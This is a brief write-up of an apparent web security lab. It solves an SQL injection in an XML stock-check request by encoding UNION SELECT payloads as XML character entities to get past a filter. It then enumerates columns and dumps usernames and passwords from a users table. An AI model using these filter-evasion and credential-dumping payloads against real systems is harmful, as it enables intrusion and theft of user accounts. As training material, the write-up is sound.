In the checking stock page, I see that if we do some logic queries such as `1+1` in both tags `<storeId>` and `productId`, we will receive different outputs from server. This mean the web page has SQL Injection vulnerability.

When adding my input ` UNION SELECT NULL` in `<storeId>` or `productId` tag, we receive `Attack detected`. Therefore, I found a XML Converter on the Internet. For example, the above given input when converting to XML will be: `&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;&#44;&#32;&#78;&#85;&#76;&#76;`. And the server respons is:

```
718 units
null
```

When sending the input ` UNION SELECT NULL, NULL` it returns `0 units`, which mean the database only has 1 column.

The challenge gives a table named `users`, to show the column use the input:
```
 UNION SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users'
```

The output shows:
```
718 units
email
password
username
```

Now just use this input we will get all credentials and solve the lab:
```
 UNION SELECT username || '~' || password FROM users
```